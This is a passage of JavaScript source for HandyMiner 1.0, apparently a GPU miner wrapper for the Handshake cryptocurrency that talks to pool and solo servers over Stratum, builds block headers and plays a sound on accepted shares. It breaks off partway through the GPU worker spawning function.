
/*
HANDYMINER 1.0
2019 Alex Smith <alex.smith@earthlab.tech>
A simple wrapper for cBlake OpenCL Miner
to communicate with Handshake HSD via Stratum (hstratum)

       _.-._        _.-._
     _| | | |      | | | |_
    | | | | |      | | | | |
    | | | | |      | | | | |
    | _.-'  | _  _ |  '-._ |
    ;_.-'.-'/`/  \`\`-.'-._;
    |   '    /    \    '   |
     \  '.  /      \  .`  /
      |    |        |    |

EPIC Thanks to chjj and the entire Handshake Project
EPIC Thanks to the Handshake Alliance for being a solid team
EPIC Thanks to Steven McKie for being my mentor/believing in me

*/
const fs = require('fs');
const net = require('net');
const bio = require('bufio');
const {spawn,exec, execFile} = require('child_process');
const numeral = require('numeral');
const BN = require('bn.js');
const exitHook = require('exit-hook');
process.env.FORCE_COLOR = true;

let PlayWinningSound = true;

const utils = require('./hsdUtils.js');


class HandyMiner {
	constructor(){
    let configFileName = 'config.json';
    if(typeof process.argv[2] != "undefined"){
      if(process.argv[2].indexOf('.json') >= 0){
        //use different configuration file
        configFileName = process.argv[2];
        if(!process.env.HANDYRAW){
          console.log("\x1b[36m#### LOADING CONFIG FILE: \x1b[0m"+configFileName);
        }
      }
    }
    const config = JSON.parse(fs.readFileSync(__dirname+'/../'+configFileName));
    if(config.enableHangryMode){
      if(!process.env.HANDYRAW){
        console.log("\x1b[36m#### ENABLING HANGRY MODE ####\x1b[0m");
      }
    }
    this.config = config;
    this.solutionIDs = 0;
    if(this.config.muteWinningFanfare){
        //I'd like not  to revel in the glory of getting a block...
        PlayWinningSound = false;
    }
    this.useStaticPoolDifficulty = false;
    this.poolDifficulty = -1;
    if(typeof this.config.mode == 'undefined'){
      this.config.mode = 'solo'; //solo | pool
    }
    else{
      if(this.config.mode == 'pool'){
        //check for difficulty
        if(typeof this.config.poolDifficulty != "undefined"){
          
          this.poolDifficulty = parseFloat(this.config.poolDifficulty);
          //note : should static difficulty ever be a thing, we can enable here
          this.poolDifficulty = -1; //hard coding because nobody supports static anyway
          
          if(this.poolDifficulty < 2048 && this.poolDifficulty >= 0 && this.config.host.indexOf('6block') >= 0){
            //6block pool min diff is 1024 (4)
            this.poolDifficulty = 2048;
            
            if(process.env.HANDYRAW){
              process.stdout.write(JSON.stringify({type:'stratumLog',data:'setting 6block pool min difficulty at 2048'})+'\n');
            }
            else{
              console.log("\x1b[36m6BLOCK POOL MINIMUM DIFF SET AT 2048\x1b[0m");
            }

          }
          else if(this.poolDifficulty < 512 && this.poolDifficulty >= 0 && this.config.host.indexOf('hnspool') >= 0){
            this.poolDifficulty = 512;
            
            if(process.env.HANDYRAW){
              process.stdout.write(JSON.stringify({type:'stratumLog',data:'setting hnspool pool min difficulty at 512'})+'\n');
            }
            else{
              console.log("\x1b[36mHNSPOOL POOL MINIMUM DIFF SET AT 512\x1b[0m");
            }
          }
          this.useStaticPoolDifficulty = false;//true;
          if(this.poolDifficulty == -1){
            this.useStaticPoolDifficulty = false;;
            this.poolDifficulty = -1;//init value
          }
        }
      }
    }
    this.minerIntensity = 0; //default
    this.intensitiesIndex = {};
    if(typeof this.config.intensity != "undefined"){
      this.minerIntensity = this.config.intensity;
    }
    this.isKilling = false;
    this.hasConnectionError = false;
    this.handleResponse = this.handleResponse.bind(this);
		this.targetID = "herpderpington_" + (new Date().getTime());
    this.altTargetID = "derpherpington_" + (new Date().getTime());
    this.registerID = this.targetID + '_register';
    this.altRegisterID = this.altTargetID + '_register';
    this.nonce1 = '00000000';
    this.nonce1Local = '00000000';
    this.nonce1Alt = '00000000';
    this.nonce2 = '00000000';//'00000000';
    this.host = config.host || '127.0.0.1';
    if(this.host.indexOf('://') >= 0){
      //is something like stratum+tcp://...
      this.host = this.host.split('://')[1];
      if(this.host.indexOf(':') >= 0){
        //split off port then in case user added it
        this.host = this.host.split(':')[0];
      }
    }
    
    this.port = config.port || '3008';
    this.gpuListString = config.gpus || '-1';
    this.stratumUser = config.stratum_user || 'earthlab';
    
    this.stratumUserLocal = this.stratumUser;
    this.stratumPass = config.stratum_pass || 'earthlab'; //going to think this might be wallet?
    this.platformID = config.gpu_platform || '0';
    this.sid = "";
    this.IS_HNSPOOLSTRATUM = false;
    this.gpuWorkers = {};
    this.gpuNames = {};
    this.lastGPUHashrate = {};
    if(process.argv[2] == '-1'){
      this.gpuListString = '-1';
      if(process.argv[3]){
        this.platformID = process.argv[3];
      }
    }

    if(typeof process.env.TEMP == "undefined"){
      process.env.TEMP = '/tmp';
    }

    /*
    './miner/HandyMiner.js',
      this.config.gpus,
      this.config.gpu_platform,
      this.config.gpu_mfg,
      'authorize',
      this.hsdConfig.wallet,
      this.config.stratum_user,
      this.config.stratum_pass,
      this.config.host,
      this.config.port
    */
    if(process.argv[2] && process.argv[3] && process.argv[4]){

      this.gpuListString = process.argv[2];
      this.platformID = process.argv[3];
      this.config.gpus = this.gpuListString;
      this.config.gpu_platform = this.platformID;
      this.config.gpu_mfg = process.argv[4].toLowerCase();
    }
    if(process.argv[9] && process.argv[10]){
      this.host = process.argv[9];
      this.port = process.argv[10];

    }
    if(process.argv[11]){
      //intensity
      this.minerIntensity = process.argv[11];
    }
    if(process.argv[12]){
      //pool mode
      if(process.argv[12] == 'pool'){
        this.config.mode = 'pool';
      }
      if(process.argv[12] == 'solo'){
        this.config.mode = 'solo';
      }
    }
    if(process.argv[13]){
      //pool difficulty
      this.poolDifficulty = parseInt(process.argv[13]);
      this.useStaticPoolDifficulty = true;
    }
    if(process.argv[14]){
      //too many args sheesh
      //finally we mute fanfare
      let muteFanfare = parseInt(process.argv[14]) == 1 ? false : true;
      PlayWinningSound = muteFanfare;
    }
    this.propCalls = 1;
    this.gpuDeviceBlocks = {};
    this.workByHeaders = {};
    this.isSubmitting = false;
    this.solutionCache = [];

    if(process.env.HANDYRAW){
      process.stdout.write(JSON.stringify({type:'stratumLog',data:'stratum will try to connect '+this.host+':'+this.port})+'\n')
    }
    else{
      console.log('\x1b[36mstratum will try to connect \x1b[0m'+this.host+':'+this.port);
    }
    if(!fs.existsSync(process.env.HOME+'/.HandyMiner')){
      fs.mkdirSync(process.env.HOME+'/.HandyMiner/');
    }
    if(!fs.existsSync(process.env.TEMP+'/HandyMiner')){
      fs.mkdirSync(process.env.TEMP+'/HandyMiner/');
    }
    if(!fs.existsSync(process.env.HOME+'/.HandyMiner/version.txt')){
      let myMin = Math.floor(Math.random()*59.999);
      fs.writeFileSync(process.env.HOME+'/.HandyMiner/version.txt',myMin.toString());
    }
    let gpus = this.gpuListString.split(',').map(s=>{return s.trim();});
    let platform = this.platformID;
    gpus.map(gpuID=>{
      fs.writeFileSync(process.env.HOME+'/.HandyMiner/'+platform+'_'+gpuID+'.work',"");
    })
    //fs.writeFileSync(process.env.HOME+'/.HandyMiner/miner.work',""); //clear the miner work buffer
    if(this.gpuListString == '-1'){
      this.spawnGPUWorker('-1',0);

    }
    this.startSocket();
    this.initListeners();
	}
  startAvgHashrateReporter(){

    let sumAll = 0;
    let sumAvgs = 0;

    if(typeof this.lastGPUReporterTimeout != "undefined"){
      clearTimeout(this.lastGPUReporterTimeout);
    }

    this.lastGPUReporterTimeout = setTimeout(()=>{
      Object.keys(this.lastGPUHashrate).map(k=>{
        sumAll += this.lastGPUHashrate[k].all;
        sumAvgs += this.lastGPUHashrate[k].avg;
      })
      console.log("\x1b[40;38;5;82mRIG HASHRATE\x1b[0m : \x1b[36m%s\x1b[40;38;5;82m RIG 120s AVG\x1b[0m : \x1b[36m%s\x1b[0m",numeral(sumAll).format('0.000b').replace('B','H'),numeral(sumAvgs).format('0.000b').replace('B','H'));
      this.startAvgHashrateReporter();
    },10000)
  }
  startSocket(){
    if(typeof this.server != "undefined"){
      try{
        this.server.destroy();
      }
      catch(e){

      }
    }
    this.server = net.createConnection({host:this.host,port:this.port},(socket)=>{
      this.server.setKeepAlive(true, 10000);
      this.server.setTimeout(1000 * 60 * 300);
      this.isSubmitting = false;
      if(process.env.HANDYRAW){
        process.stdout.write(JSON.stringify({type:'stratumLog',data:'stratum connected to '+this.host+':'+this.port})+'\n')
      }
      else{
        console.log('\x1b[36mstratum server is connected to\x1b[0m '+this.host+':'+this.port);
      }


      const stratumUsersFromArgs = this.getStratumUserPass();
      let stratumUser = stratumUsersFromArgs.user;
      let stratumPass = stratumUsersFromArgs.pass;//always leave blank and ser user as wallet //stratumUsersFromArgs.pass;
      this.stratumUser = stratumUser;
      this.stratumPass = stratumPass;

      if(process.env.HANDYRAW){
        process.stdout.write(JSON.stringify({type:'stratumLog',data:'Calling Miner Authorize'})+'\n')
      }
      else{
        console.log("\x1b[36mCALLING AUTHORIZE, CONGRATS\x1b[0m")

      }

      let callTS = new Date().getTime();
      //this is some admin user i think?
      const serverAdminPass = stratumUsersFromArgs.serverPass;
      if(this.config.mode == 'pool' && this.host.toLowerCase().indexOf('hnspool') >= 0){
        //format connection messages for hnspool        
        this.server.write(JSON.stringify({"id":this.targetID,"method":"authorize","params":[stratumUser,stratumPass, "handy-miner-v0.0.0"]})+"\n");
        //this.server.write(JSON.stringify({"id":this.registerID,"method":"subscribe","params":["handy-miner-v0.0.0", this.sid]})+"\n");
      }
      else{
        //format connection strings for solo stratum
        if(this.config.mode == 'solo'){
          this.server.write(JSON.stringify({"params": [serverAdminPass], "id": "init_"+callTS+"_user_"+stratumUser, "method": "mining.authorize_admin"})+'\n');
        }
        if(this.host.toLowerCase().indexOf('poolflare') == -1){
          this.server.write(JSON.stringify({"params": [stratumUser,stratumPass], "id": "init_"+callTS+"_user_"+stratumUser, "method": "mining.add_user"})+'\n');
        }
        this.server.write(JSON.stringify({"id":this.targetID,"method":"mining.authorize","params":[stratumUser,stratumPass]})+"\n");
        if(this.config.mode == 'solo'){
          this.server.write(JSON.stringify({"id":this.registerID,"method":"mining.subscribe","params":[]})+"\n");
        }
        else{
          this.server.write(JSON.stringify({"id":this.registerID,"method":"mining.subscribe","params":['user agent/version']})+"\n");
        }
      }


      //kill connection when we kill the script.
      //stratum TODO: gracefully handle messy deaths/disconnects from clients else it kills hsd atm.
      
      exitHook(()=>{

        //this.gpuWorker.kill();
        this.isKilling = true;
        Object.keys(this.gpuWorkers).map(k=>{
          this.gpuWorkers[k].stdin.pause();
          this.gpuWorkers[k].kill();
        });
        this.server.destroy();
        if(typeof this.mCheck != "undefined"){
          clearInterval(this.mCheck);
        }
        if(typeof this.checkTiming != "undefined"){
          clearTimeout(this.checkTiming);
        }
        if(typeof this.redundant != "undefined"){
          this.redundant.destroy();
        }

      })
    });
    let ongoingResp = '';
    this.server.on('data',(response)=>{
      //if(!this.isMGoing){
        this.hasConnectionError = false;
        //console.log('server response',response.toString('utf8'));
        
        ongoingResp = this.parseServerResponse(response,ongoingResp,true);
      //}

    });
    this.server.on('error',(response)=>{

      if(response.code == "ECONNREFUSED" && response.syscall == "connect" && !this.isKilling){

        if(process.env.HANDYRAW){
          process.stdout.write('{"type":"error","message":"STRATUM CONNECTION REFUSED, TRYING AGAIN IN 20s"}\n');
        }
        else{
          console.log("HANDY:: \x1b[36mSTRATUM CONNECTION REFUSED, TRYING AGAIN IN 20s\x1b[0m")
        }
        this.hasConnectionError = true;
      }
    });

    this.server.on('close',(response)=>{
      if(this.isMGoing){
        //stratum disconnected
        this.stratumWasDisconnected = true;
      }
      else{
        this.stratumWasDisconnected = false;
        this.handleStratumReconnect();
      }

    })
    this.server.on('timeout',(response)=>{
      if(this.isMGoing){
        //stratum disconnected
        this.stratumWasDisconnected = true;
      }
      else{
        this.stratumWasDisconnected = false;
        this.handleStratumReconnect();
      }
      //console.log('server timed out',response);
    })
  }
  handleStratumReconnect(){
    if(!this.isKilling && !this.hasConnectionError){
      //unplanned
      if(process.env.HANDYRAW){
        process.stdout.write(JSON.stringify({type:'error','message':'STRATUM CONNECTION WAS CLOSED. RECONNECTING NOW.'})+'\n');
      }
      else{
        console.log('HANDY:: \x1b[36mSTRATUM CONNECTION CLOSED BY PEER, RECONNECTING\x1b[0m');
      }
      this.hasConnectionError = true;
      this.startSocket();

    }
    else if(this.hasConnectionError && !this.isKilling){
      //we had trouble connecting/reconnecting
      if(typeof this.restartTimeout != "undefined"){
        clearTimeout(this.restartTimeout);
        delete this.restartTimeout;
      }
      this.restartTimeout = setTimeout(()=>{
        this.startSocket();
      },20000);
    }
  }
  parseServerResponse(response,ongoingResp,isLocalResponse){
    //parse stratum response.
    //simple, right?
    //it'll naturall break up big reponses into multiple new line responses
    //conveniently we're hunting for json objs that are just newline separated
    //and of course there's a tailing comma returned in big objs, of course...
    //MASSIVELY ANNOYING TODO: ELIMINATE TRAILING COMMA IN BIG RESPONSES FROM STRATUM
    let resp = response.toString('utf8').split('\n');
    let didParse = true;
    
    //take care to check for empty lines
    resp = resp.filter((d)=>{
      return d.length > 1;
    });

    resp = resp.map((d)=>{
      let ret = {};
      try{
        ret = JSON.parse(d);
        didParse = true;
      }
      catch(e){
        ongoingResp += resp;
        try{
          ret = JSON.parse(ongoingResp);
          didParse = true;
        }
        catch(e){
          //nope
          didParse = false;
            if(ongoingResp.slice(-2) == '},'){
              //wtf its adding a trailing comma?
              try{
                ret = JSON.parse(ongoingResp.slice(0,-1));
                didParse = true;
              }
              catch(e){
                try{
                  let last = ongoingResp.split('},');
                  last = last.filter(d=>{
                    return d.length > 1;
                  });

                  if(last.length > 1){
                    //ok get the last line
                    let len = ongoingResp.split('},').length;
                    last = last[last.length-1]+'}';
                    ret = JSON.parse(last);
                    didParse = true;
                  }
                  //ret = JSON.parse(ongoingResp.slice(0,-1))
                }
                catch(e){
                  ret = ongoingResp;
                  ongoingResp = ''; //just effing reset it...
                  didParse = false;
                }

              }
            }



        }
      }
      if(didParse){
        ongoingResp = '';///reset

      }
      return ret;
    });
    //(!this.isMGoing){
    if((isLocalResponse && !this.isMGoing) || (!isLocalResponse && this.isMGoing)){
      this.handleResponse(resp);
    }
    //}
    //else{
    //if(this.isMGoing){
      //console.log('mining message',resp);
    resp.map((d)=>{
      switch(d.method){
        case 'authorize':
          this.IS_HNSPOOLSTRATUM = true;
          let authResult = d.result;
          if(authResult[1] === true){
            if(fs.existsSync(process.env.HOME+'/.HandyMiner/hnspool_sid.txt')){
              this.sid = fs.readFileSync(process.env.HOME+'/.HandyMiner/hnspool_sid.txt').toString('utf8');
            }
            this.server.write(JSON.stringify({"id":this.registerID,"method":"subscribe","params":["handy-miner-v1.0.0", this.sid]})+"\n");
            if(process.env.HANDYRAW){
              process.stdout.write(JSON.stringify({type:'stratumLog',data:'HNSPOOL AUTHORIZATION SUCCESS.'})+'\n')
            }
            else{
              console.log("HANDY:: \x1b[36mHNSPOOL AUTHORIZATION SUCCESS\x1b[0m")
            }
          }
          else{
            if(process.env.HANDYRAW){
              process.stdout.write(JSON.stringify({type:'stratumLog',data:'HNSPOOL AUTHORIZATION FAILED. RETRY IN 20s.'})+'\n')
            }
            else{
              console.log("HANDY:: \x1b[36mHNSPOOL AUTHORIZATION FAILED\x1b[0m")
              console.log("HANDY:: \x1b[36m RETRY IN 20s\x1b[0m")
            }
            //process.exit(0);
            setTimeout(()=>{
              this.startSocket();
            },20000);
          } 
        break;
        case 'subscribe':
          this.sid = d.result;
          fs.writeFileSync(process.env.HOME+'/.HandyMiner/hnspool_sid.txt',this.sid);
          //this.nonce1 = d.result;
          if(this.isMGoing){
            this.nonce1Local = d.result;
          }
          else{
            this.nonce1 = d.result;
          }
          this.IS_HNSPOOLSTRATUM = true;
          break;
        case 'notify':
          this.IS_HNSPOOLSTRATUM = true;
        break;
        case 'mining.notify':
        case 'notify':
          if(/*this.isMGoing*/isLocalResponse){
            this.lastLocalResponse = d;
            //this.refreshAllJobs();
          }
        break;
        case 'mining.set_difficulty':
        case 'set_difficulty':
        
          if(!this.useStaticPoolDifficulty && this.config.mode == 'pool'){
            let lastDiff = this.poolDifficulty;
            //do adaptive diff here
            //but nobody implements it yet
            if(this.host.toLowerCase().indexOf('hnspool') >= 0 || typeof d.params != 'object'){
              this.poolDifficulty = parseFloat(d.params) * 256;
            }
            else{
              this.poolDifficulty = parseFloat(d.params[0]) * 256;  
            }

            if(this.config.mode == 'pool' && (lastDiff != this.poolDifficulty)){
              this.refreshAllJobs();
                if(process.env.HANDYRAW){
                  process.stdout.write(JSON.stringify({type:'stratumLog',data:'Successfully set dynamic pool difficulty to'+this.poolDifficulty})+'\n')
                }
                else{
                  console.log("HANDY:: \x1b[36mSET DYNAMIC POOL DIFFICULTY TO "+this.poolDifficulty+"\x1b[0m");
                }
            }
          }
        
        break;
      }
      if(d.error != null && typeof d.method == "undefined"){
        if(d.error.length > 0){
          if(d.error[0] == 23){
            //high hash
            this.refreshOutstandingJobs();
            //this.refreshAllJobs();
          }
        }
      }
    });

    //}
    return ongoingResp;
  }
  dieGracefully(){

  }
  getStratumUserPass(){
    let user = this.stratumUser, pass = this.stratumPass;
    let stratumServerPass = this.stratumPass;
    if(process.argv.indexOf('authorize') >= 0){
      if(typeof process.argv[process.argv.indexOf('authorize')+1] != "undefined"){
        //we have username
        user = process.argv[process.argv.indexOf('authorize')+1];
      }
      if(typeof process.argv[process.argv.indexOf('authorize')+2] != "undefined"){
        //we have pass
        pass = process.argv[process.argv.indexOf('authorize')+2];
        stratumServerPass = process.argv[process.argv.indexOf('authorize')+2];
      }
      if(typeof process.argv[process.argv.indexOf('authorize')+3] != "undefined"){
        //we have pass
        stratumServerPass = process.argv[process.argv.indexOf('authorize')+3];
      }
    }
    if(this.isMGoing){
      user = this.stratumUserLocal;
    }
    return {user:user,pass:pass,serverPass:stratumServerPass};
  }
	handleResponse(JSONLineObjects){
		JSONLineObjects.map((d)=>{
			switch(d.method){
                    //@todo this can be fixed later to add more features
        case 'authorize':
        break;
        case 'submit':
        //console.log('submit event',d);
          if(d.error != null){
            if(d.error.length > 0){
              this.displayHighHashError(d);

            }
          }
          else{
            this.displayWin(d,true);
            this.generateWork();
          }
        break;
        case 'subscribe':
        break;
        case 'mining.notify':
				case 'notify':

					if(process.env.HANDYRAW){
            process.stdout.write(JSON.stringify({type:'stratumLog',data:'Received New Job From Stratum'})+'\n')
          }
          else{
            console.log("HANDY:: \x1b[36mJOB RECEIVED FROM STRATUM\x1b[0m")
          }
          if(!d.error){
            this.lastResponse = d;
            //console.log('we set last response from new response',d);
          }
          if(!this.isMGoing){
            this.lastLocalResponse = d;
          }
          this.isSubmitting = false;
          this.solutionCache = [];
          if(Object.keys(this.gpuWorkers).length == 0){
            this.mineBlock(d);
          }
          else{
            this.notifyWorkers(d);
          }
          this.cleanLocalWorkCache();
          //this.mineBlock(d);

				break; //got some new jarbs or block
				case 'set_difficulty':
        case 'mining.set_difficulty':
					//TODO impl pool difficulty vs solo diff that we're using now
				break;
				case undefined:

          if(d.id == this.targetID && !this.isMGoing){
						//in the case we pass back my id i know it's a message for me
            if(process.env.HANDYRAW){
              process.stdout.write(JSON.stringify({type:'stratumLog',data:'Successfully Registered With Stratum'})+'\n')
            }
            else{
              console.log("HANDY:: \x1b[36mREGISTERED WITH THE STRATUM\x1b[0m");
            }

					}
          else if(d.id == this.registerID){
            //we just registered
            if(d.error){
              if(d.error[1] == 'not up to date'){
                if(!process.env.HANDYRAW){
                    console.log("\x1b[31mHANDY:: STRATUM ERROR: "+d.error[1]+"\x1b[0m");
                }
                else{
                  process.stdout.write(JSON.stringify({type:'error',message:d.error[1],data:d})+'\n')
                }
              }
            }
            if(d.result == null && d.error != null){
              //was an error
              if(!process.env.HANDYRAW){
                  console.log("\x1b[31mHANDY:: STRATUM ERROR: "+d.error[1]+"\x1b[0m");
              }
              else{
                process.stdout.write(JSON.stringify({type:'error',message:d.error[1],data:d})+'\n')
              }
            }
            else{
              this.nonce1 = d.result[1];
              this.nonce1Local = d.result[1];
            }
          }
          else if(d.id == this.altRegisterID){
            this.nonce1 = d.result[1];
            this.nonce1Alt = d.result[1];
          }
          else if(typeof d.result != "undefined" && d.error == null && this.isSubmitting){
            //we found a block probably
            //console.log('submit result',d);
            this.displayWin(d);
            if(!d.result && !this.isMGoing){
              if(process.env.HANDYRAW){
                process.stdout.write(JSON.stringify({type:'error',message:'problem with share', data: d})+'\n')
              }
              else{
                console.log('\x1b[36mHANDY::\x1b[0m PROBLEM WITH YOUR SHARE',d);
              }

            }
          }
          else{
            if(!process.env.HANDYRAW && Object.keys(d).length > 0 && !this.isMGoing){
              if(d.error != null){
                if(d.error[1] != 'User already exists.' && d.error[1] != 'high-hash'){
                  //yea dont care here
                  console.log('\x1b[36mSTRATUM EVENT LOG::\x1b[0m',d);
                }
                if(d.error[1] == 'high-hash'){
                  //6block reports this when we get a share
                  if( (this.config.mode == 'solo' && !this.isMGoing) || (!this.isMGoing && this.config.mode == 'pool' && this.host.indexOf('6block') == -1) ){
                      console.log("\x1b[36mSTRATUM EVENT LOG::\x1b[0m STALE SUBMIT");
                  }
                  else if(!this.isMGoing && this.config.mode == 'pool' && this.host.indexOf('6block') >= 0 && d.error[0] == 'invalid'){
                    //add result to d to make sounds play
                    //if it's 6 block and we are in pool mode this error means we got a share
                    //share.powHash().compare(job.target) <= 0 => addBlock in hstratum will throw high-hash
                    d.result = [];
                    //console.log('high hash tho??',d);
                    this.displayWin(d,true);
                  }
                  else if(!this.isMGoing && this.config.mode == 'pool' && this.host.indexOf('6block') >= 0 && d.error[0] != 'invalid'){
                    //its actually a high-hash error
                    this.displayHighHashError(d);
                  }

                  //prob jumped the gun, lets generate work
                  this.generateWork();
                }
              }
              else{
                //err is null, could be a lagging success message
                if(d.id.indexOf('solution_') >= 0 && d.result){
                  //we won the block
                  this.displayWin(d,true);
                  this.generateWork();
                }
                else if(!process.env.HANDYRAW){
                  console.log('\x1b[36mSTRATUM EVENT LOG::\x1b[0m',d);
                }
              }
            }
            else if(process.env.HANDYRAW && Object.keys(d).length > 0 && !this.isMGoing && (this.config.mode == 'pool' && this.host.indexOf('6block') >= 0)){
              //we should let the dashboard know about the share
                this.displayWin(d,true);
                this.generateWork();
              
            }
          }
				break;

				default:
          if(!process.env.HANDYRAW){
					 console.log('\x1b[36mSTRATUM EVENT LOG::\x1b[0m some unknown event happened!',d)
          }
				break;
			}
		})
	}
  cleanLocalWorkCache(){
    let oldKeys = [];
    let expireTime = Math.floor(new Date().getTime()/1000)-(60*30); //30 mins ago
    Object.keys(this.workByHeaders).map(headerKey=>{
      let data = this.workByHeaders[headerKey];
      let time = data.createdAt;//data.work.time;
      if(time < expireTime){
        oldKeys.push(headerKey);
      }
    });
    oldKeys.map(k=>{
      delete this.workByHeaders[k];
    });
  }
  displayHighHashError(d){

    let pooldiff = this.poolDifficulty;
    let newBits = this.targetFromDifficulty(pooldiff);
    let newDiff = this.toDifficulty(newBits);
    let newTarget = utils.getTarget(newBits);
    if(process.env.HANDYRAW){
      process.stdout.write(JSON.stringify({type:'error',message:'problem with share', data: d, target:newTarget.toString('hex')})+'\n')
    }
    else{
      console.log('\x1b[36mHANDY::\x1b[0m PROBLEM WITH YOUR SHARE',d);
      console.log('\x1b[36mHANDY::\x1b[0m SHARE TARGET WAS',newTarget.toString('hex'));

    }
  }
  displayWin(d,isPoolBlockHighHash){
    this.isSubmitting = false;
    let granule = "BLOCK";
    if(this.config.mode == 'pool'){
      granule = 'SHARE';
    }
    if(!process.env.HANDYRAW && !this.isMGoing){

      console.log('\x1b[36mHANDY:: ACCEPTED '+granule+'! :::\x1b[0m ','\x1b[32;5;7m[̲̅$̲̅(̲̅Dο̲̅Ll͟a͟r͟y͟Dο̲̅ο̲̅)̲̅$̲̅]\x1b[0m');
    }
    else if(process.env.HANDYRAW && !this.isMGoing){

      process.stdout.write(JSON.stringify({type:'confirmation',granule:granule})+'\n');
    }
    this.playSound();
    if(d.result && !this.isMGoing){
      if(process.env.HANDYRAW){
        process.stdout.write(JSON.stringify({type:'confirmation',message:'Received Confirmation Response',data:d})+'\n')
      }
      else{
        if(this.config.mode == 'pool'){
          console.log('HANDY:: \x1b[36mCONFIRMATION RESPONSE!\x1b[0m');
        }
        else{
          console.log('HANDY:: \x1b[36mCONFIRMATION RESPONSE!\x1b[0m',d);
        }
        
      }

    }
  }
  playSound(){
    if(process.platform.indexOf('linux') >= 0 && !this.isMGoing ){
      if(PlayWinningSound){
        try{
          let s = spawn('aplay',[__dirname+'/winning.wav']);
          s.stderr.on('data',(e)=>{
            //didnt get to play sound, boo!
          })
          if(typeof this._sound != "undefined"){
            this._sound.kill();
          }
          this._sound = s;
        }
        catch(e){
          //no sound drivers here...

        }
      }
    }
    else{
        //were prob windowsy
        //powershell -c '(New-Object Media.SoundPlayer "C:\Users\earthlab\dev\HandyMinerMAY\miner\winning.wav").PlaySync()';
        if(process.platform.indexOf('win') == 0 && !this.isMGoing ){
          if(PlayWinningSound){
              let s = spawn('powershell.exe',['-c','(New-Object Media.SoundPlayer "'+__dirname+'\\winning.wav").PlaySync()']);
              s.stderr.on('data',(e)=>{
                //didnt get to play sound, boo!
              })

              if(typeof this._sound != "undefined"){
                this._sound.kill();
              }
              this._sound = s;
          }
        }
        if(process.platform.indexOf('darwin') >= 0 && !this.isMGoing ){
          if(PlayWinningSound){
              let s = spawn('afplay',[__dirname+'/winning.wav']);
              s.stderr.on('data',(e)=>{
                //didnt get to play sound, boo!
              })
              if(typeof this._sound != "undefined"){
                this._sound.kill();
              }
              this._sound = s;
          }
        }
    }
  }
  notifyWorkers(){

    this.generateWork();
  }
	getBlockHeader(nonce2Override){
		const _this = this;
    const response = this.lastResponse;
    if(typeof response == "undefined"){
      this.server.destroy();
      return;
    }
    if(typeof response.params == "undefined"){
      //last work was erroneous, lets reconnect to pool and force new worky......
      this.server.destroy();
      return;
    }
    const jobID = response.params[0];
    const prevBlockHash = response.params[1];

    const merkleRoot = response.params[2];

    let nonce2 = this.nonce2;
    if(typeof nonce2Override != "undefined"){
      nonce2 = nonce2Override;
    }
    let reservedRoot;
    let witnessRoot;
    let treeRoot;
    let maskHash;
    let version;
    let bits;
    let time;
    
    if(this.IS_HNSPOOLSTRATUM && !this.isMGoing){
      //support HNSPOOL response format
      reservedRoot = response.params[3]; //these are prob all zeroes rn but here for future use
      witnessRoot = response.params[4];
      treeRoot = response.params[5];
      maskHash = response.params[6];
      version = response.params[7];
      bits = response.params[8];
      time = response.params[9];

    }
    else{
      witnessRoot = response.params[3];
      treeRoot = response.params[4];
      reservedRoot = response.params[5]; //these are prob all zeroes rn but here for future use
      version = parseInt(response.params[6], 16);
      bits = parseInt(response.params[7], 16);
      time = parseInt(response.params[8], 16);
    }

    if( this.IS_HNSPOOLSTRATUM && (!Number.isSafeInteger(version) || !Number.isSafeInteger(bits) || !Number.isSafeInteger(time)) ){
      //if version,bits,time are not safe integer, reconnect to hnspool
      this.isMGoing = false;
      this.hasConnectionError = true;
      this.isKilling = false;
      if(typeof this.redundant != "undefined"){
        this.redundant.destroy();
        delete this.redundant;
      }
      else{
        this.server.destroy();
        
      }
      //restart hnspool connection
      this.handleStratumReconnect();
        
      return;  
    }

    let bt = {};//new template.BlockTemplate();

    bt.prevBlock = Buffer.from(prevBlockHash,'hex');
    bt.treeRoot = Buffer.from(treeRoot,'hex');
    bt.version = version;
    bt.time = time;
    bt.bits = bits;
    bt.witnessRoot = Buffer.from(witnessRoot,'hex');
    bt.reservedRoot = Buffer.from(reservedRoot,'hex');

    if(this.IS_HNSPOOLSTRATUM && !this.isMGoing){
      bt.maskHash = Buffer.from(maskHash, 'hex');
    }
    else{
      //TODO: When hstratum finally sends out .maskHash() values add here
      //like this:: bt.maskHash = Buffer.from(maskHash, 'hex');
      //should be replaced in hstratum .toJSON output array 
      //where 0000000000000000000000000000000000000000000000000000000000000000's are now
      //for now we zero it out locally
      let mask = utils.ZERO_HASH;
      bt.mask = mask;
      bt.maskHash = utils.maskHash(bt.prevBlock,mask);
    }

    try{
      bt.target = utils.getTarget(bt.bits);
      bt.difficulty = utils.getDifficulty(bt.target);
    }
    catch(e){
      //console.error('error setting block pieces',response);
    }
    if(this.config.mode == 'pool' || this.isMGoing){
      bt.difficulty = this.toDifficulty(bt.bits);
      let pooldiff = this.poolDifficulty;

      let newBits = this.targetFromDifficulty(pooldiff);
      let newDiff = this.toDifficulty(newBits);
      let newTarget = utils.getTarget(newBits);

      bt.target = utils.getTarget(newBits);

    }

    let hRoot = merkleRoot;
    bt.merkleRoot = hRoot;
    let nonce = Buffer.alloc(4, 0x00);

    const exStr = Buffer.from(this.nonce1+nonce2,'hex');
    
    let extraNonce = Buffer.alloc(utils.NONCE_SIZE, 0x00);//utils.ZERO_NONCE;
    for(var i=0;i<exStr.length;i++){
      extraNonce[i] = exStr[i];
    }
    
    bt.extraNonce = extraNonce;

    const hdrRaw = utils.getRawHeader(0, bt);
    const data = utils.getMinerHeader(hdrRaw,0,time,bt.maskHash);
    const pad8 = utils.padding(8,bt.prevBlock,bt.treeRoot);
    const pad32 = utils.padding(32,bt.prevBlock,bt.treeRoot);
    const targetString = bt.target.toString('hex');
    
    return {
      jobID:jobID,
      time:time,
      header: data,
      pad8:pad8,
      pad32:pad32,
      rawHeader:hdrRaw,
      nonce:nonce,
      target: bt.target,
      nonce2: nonce2,
      blockTemplate:bt,
      extraNonce:extraNonce
    };
	}
  spawnGPUWorker(gpuID,gpuArrayI){

    let envVars = process.env;
    if(typeof envVars.TEMP == "undefined"){
      envVars.TEMP = '/tmp';
    }
    
    if(this.config.enableHangryMode){
      envVars.ENABLE_HANGRYMODE = true;
      //enable hangry mode for some VII/5700s
    }
    let executableFileName = './cBlakeMiner_AMD';
    let gpuMfg = this.config.gpu_mfg.toLowerCase() || 'nvidia';
    if(gpuMfg.indexOf(',') > 0){
      if(typeof gpuMfg.split(',')[gpuArrayI] != "undefined"){
        gpuMfg = gpuMfg.split(',')[gpuArrayI];
      }

    }
